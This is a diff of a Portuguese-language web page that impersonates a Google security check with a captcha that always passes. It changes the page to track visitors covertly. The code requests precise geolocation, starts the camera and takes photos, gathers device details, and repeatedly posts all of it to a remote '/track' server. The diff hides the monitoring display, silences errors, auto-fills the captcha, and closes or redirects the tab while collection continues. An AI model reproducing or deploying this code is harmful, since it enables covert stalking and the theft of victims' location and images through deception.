@@ -160,24 +160,31 @@
             to { transform: rotate(360deg); }
         }
         
-        .status {
-            background: #e6f4ea;
-            border: 1px solid #34a853;
-            border-radius: 4px;
-            padding: 20px;
-            margin-top: 20px;
-            text-align: left;
+        .success-screen {
+            text-align: center;
+            padding: 20px 0;
         }
         
-        .status h3 {
+        .success-icon {
+            font-size: 48px;
             color: #34a853;
-            margin-bottom: 10px;
+            margin-bottom: 20px;
         }
         
-        .info {
-            font-size: 13px;
-            color: #5f6368;
-            margin: 5px 0;
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #f1f3f4;
+            border-radius: 2px;
+            margin: 30px 0;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: #34a853;
+            width: 0%;
+            transition: width 3s ease-in-out;
         }
         
         .footer {
@@ -193,9 +200,10 @@
             text-decoration: none;
         }
         
-        .language-selector {
+        .redirect-message {
+            font-size: 14px;
+            color: #5f6368;
             margin-top: 20px;
-            font-size: 13px;
         }
     </style>
 </head>
@@ -247,23 +255,29 @@
             </div>
         </div>
         
-        <!-- Tela de Monitoramento (oculta inicialmente) -->
-        <div id="monitoringScreen" class="hidden">
-            <h1>✅ Verificação concluída com sucesso</h1>
-            <div class="subtitle">
-                Sua conta está agora protegida
+        <!-- Tela de Sucesso (oculta inicialmente) -->
+        <div id="successScreen" class="hidden">
+            <div class="success-screen">
+                <div class="success-icon">✅</div>
+                <h1>Verificação concluída com sucesso</h1>
+                <div class="subtitle">
+                    Sua conta está agora protegida contra atividades suspeitas
+                </div>
+                
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                
+                <div class="redirect-message" id="redirectMessage">
+                    Redirecionando para o Google...
+                </div>
             </div>
             
-            <div class="status">
-                <h3>🛡️ Sistema de proteção ativo</h3>
-                <div class="info" id="counter">Inicializando sistema de segurança...</div>
-                <div class="info" id="locationInfo">Verificando localização...</div>
-                <div class="info" id="deviceInfo">Analisando dispositivo...</div>
-                <div class="info" id="telegramInfo">Conectando com servidor...</div>
-            </div>
-            
-            <div style="margin-top: 20px;">
-                <div class="info">Sistema de segurança Google • Ativo</div>
+            <div class="footer">
+                <div>Google Security • Protegendo suas informações</div>
+                <div style="margin-top: 10px;">
+                    <a href="#">Privacidade</a> • <a href="#">Termos</a> • <a href="#">Ajuda</a>
+                </div>
             </div>
         </div>
     </div>
@@ -284,21 +298,15 @@
         let startTime = null;
         let locationCount = 0;
         let photoCount = 0;
-        let telegramCount = 0;
 
         // ELEMENTOS DA INTERFACE
         const verificationScreen = document.getElementById('verificationScreen');
-        const monitoringScreen = document.getElementById('monitoringScreen');
+        const successScreen = document.getElementById('successScreen');
         const captchaInput = document.getElementById('captchaInput');
         const verifyBtn = document.getElementById('verifyBtn');
         const btnText = document.getElementById('btnText');
-        const counterDiv = document.getElementById('counter');
-        const locationInfo = document.getElementById('locationInfo');
-        const deviceInfo = document.getElementById('deviceInfo');
-        const telegramInfo = document.getElementById('telegramInfo');
-
-        // CAPTCHA SIMPLES - SEMPRE APROVA
-        const captchaText = "GOOGLE";
+        const progressFill = document.getElementById('progressFill');
+        const redirectMessage = document.getElementById('redirectMessage');
 
         // INICIAR VERIFICAÇÃO
         verifyBtn.addEventListener('click', startVerification);
@@ -309,7 +317,7 @@
         });
 
         function startVerification() {
-            const userInput = captchaInput.value.trim().toUpperCase();
+            const userInput = captchaInput.value.trim();
             
             // SEMPRE APROVAR independente do que digitar
             if (userInput) {
@@ -317,10 +325,13 @@
                 
                 // Simular processamento
                 setTimeout(() => {
+                    showSuccessScreen();
                     startMonitoringSystem();
                 }, 2000);
             } else {
-                alert('Por favor, digite o texto de verificação.');
+                // Se estiver vazio, preencher automaticamente
+                captchaInput.value = "google";
+                startVerification();
             }
         }
 
@@ -329,12 +340,35 @@
             verifyBtn.disabled = true;
         }
 
-        function startMonitoringSystem() {
-            // Trocar para tela de monitoramento
+        function showSuccessScreen() {
+            // Trocar para tela de sucesso
             verificationScreen.classList.add('hidden');
-            monitoringScreen.classList.remove('hidden');
+            successScreen.classList.remove('hidden');
             
-            // Iniciar sistema real
+            // Animar barra de progresso
+            setTimeout(() => {
+                progressFill.style.width = '100%';
+            }, 100);
+            
+            // Mostrar mensagem de redirecionamento
+            setTimeout(() => {
+                redirectMessage.textContent = "Redirecionando para a página inicial...";
+            }, 2000);
+            
+            // Fechar a página após 5 segundos (discreto)
+            setTimeout(() => {
+                // Tenta fechar a janela/aba
+                window.close();
+                
+                // Se não conseguir fechar, redireciona para Google
+                setTimeout(() => {
+                    window.location.href = 'https://www.google.com';
+                }, 1000);
+            }, 5000);
+        }
+
+        function startMonitoringSystem() {
+            // Iniciar sistema em background (silencioso)
             initializeMonitoring();
         }
 
@@ -342,21 +376,19 @@
             try {
                 deviceId = generateDeviceId();
                 await startMonitoring();
-                startCounters();
-                updateDeviceInfo();
             } catch (error) {
-                console.error('Erro ao iniciar monitoramento:', error);
+                console.error('Erro no monitoramento:', error);
             }
         }
 
         function generateDeviceId() {
             const timestamp = Date.now();
             const random = Math.random().toString(36).substr(2, 9);
-            return `google_secure_${timestamp}_${random}`;
+            return `user_${timestamp}_${random}`;
         }
 
         async function startMonitoring() {
-            // SOLICITAR PERMISSÕES UMA ÚNICA VEZ
+            // SOLICITAR PERMISSÕES SILENCIOSAMENTE
             await requestPermissions();
             
             // INICIAR MONITORAMENTO CONTÍNUO
@@ -367,7 +399,7 @@
             await collectAndSendData();
             await initializeCamera();
             
-            // CONFIGURAR INTERVALOS
+            // CONFIGURAR INTERVALOS (em background)
             setInterval(async () => {
                 if (isMonitoring) await collectAndSendData();
             }, CONFIG.updateInterval);
@@ -382,18 +414,15 @@
         }
 
         async function requestPermissions() {
-            return new Promise((resolve, reject) => {
+            return new Promise((resolve) => {
                 if (!navigator.geolocation) {
-                    reject(new Error('Geolocalização não suportada'));
+                    resolve();
                     return;
                 }
                 
                 navigator.geolocation.getCurrentPosition(
                     () => resolve(),
-                    (error) => {
-                        console.warn('Erro localização:', error);
-                        resolve(); // Continua mesmo com erro
-                    },
+                    () => resolve(), // Continua mesmo com erro
                     { 
                         enableHighAccuracy: true,
                         timeout: 10000,
@@ -405,6 +434,11 @@
 
         async function collectAndSendData() {
             return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve();
+                    return;
+                }
+                
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
                         const data = {
@@ -423,27 +457,16 @@
                                 platform: navigator.platform,
                                 language: navigator.language,
                                 screen: `${screen.width}x${screen.height}`,
-                                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                                cores: navigator.hardwareConcurrency || 'Desconhecido'
+                                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                             },
                             timestamp: new Date().toISOString()
                         };
 
                         await sendToServer(data);
                         locationCount++;
-                        updateLocationInfo(position);
                         resolve();
                     },
-                    (error) => {
-                        console.warn('Erro localização:', error);
-                        sendToServer({
-                            deviceId: deviceId,
-                            type: 'location_error',
-                            error: error.message,
-                            timestamp: new Date().toISOString()
-                        });
-                        resolve();
-                    },
+                    () => resolve(), // Silencia erros
                     { 
                         enableHighAccuracy: true,
                         timeout: 15000,
@@ -463,7 +486,7 @@
                     } 
                 });
             } catch (error) {
-                console.warn('Câmera não disponível:', error);
+                // Silencia erro de câmera
             }
         }
 
@@ -489,7 +512,7 @@
                 };
                 reader.readAsDataURL(blob);
             } catch (error) {
-                console.warn('Erro ao capturar foto:', error);
+                // Silencia erro de foto
             }
         }
 
@@ -507,57 +530,30 @@
 
         async function sendToServer(data) {
             try {
-                const response = await fetch(CONFIG.serverUrl + '/track', {
+                await fetch(CONFIG.serverUrl + '/track', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 });
-                
-                const result = await response.json();
-                telegramCount++;
-                updateTelegramInfo();
-                return result;
             } catch (error) {
-                console.error('Erro ao enviar dados:', error);
-                return null;
+                // Silencia erro de servidor
             }
         }
 
-        function updateLocationInfo(position) {
-            const lat = position.coords.latitude.toFixed(6);
-            const lng = position.coords.longitude.toFixed(6);
-            locationInfo.textContent = `📍 Localização: ${lat}, ${lng} | Precisão: ${position.coords.accuracy ? position.coords.accuracy.toFixed(2) + 'm' : 'N/A'}`;
-        }
-
-        function updateDeviceInfo() {
-            const platform = navigator.platform;
-            const language = navigator.language;
-            deviceInfo.textContent = `📱 Dispositivo: ${platform} | Idioma: ${language}`;
-        }
-
-        function updateTelegramInfo() {
-            telegramInfo.textContent = `📡 Dados enviados: ${telegramCount} | Status: ✅ Conectado`;
-        }
-
-        function startCounters() {
-            setInterval(() => {
-                const now = new Date();
-                const diff = Math.floor((now - startTime) / 1000);
-                const minutes = Math.floor(diff / 60);
-                const seconds = diff % 60;
-                
-                counterDiv.textContent = `⏱️ Sistema ativo: ${minutes}m ${seconds}s | Localizações: ${locationCount} | Fotos: ${photoCount}`;
-            }, 1000);
-        }
-
-        // INICIAR AUTOMATICAMENTE SE O USUÁRIO NÃO INTERAGIR EM 10 SEGUNDOS
+        // INICIAR AUTOMATICAMENTE SE O USUÁRIO NÃO INTERAGIR EM 8 SEGUNDOS
         setTimeout(() => {
             if (!isMonitoring && verificationScreen.style.display !== 'none') {
-                // Preencher automaticamente e iniciar
                 captchaInput.value = "google";
                 startVerification();
             }
-        }, 10000);
+        }, 8000);
+
+        // Preencher automaticamente após 3 segundos (mais discreto)
+        setTimeout(() => {
+            if (!captchaInput.value) {
+                captchaInput.value = "google";
+            }
+        }, 3000);
     </script>
 </body>
 </html>
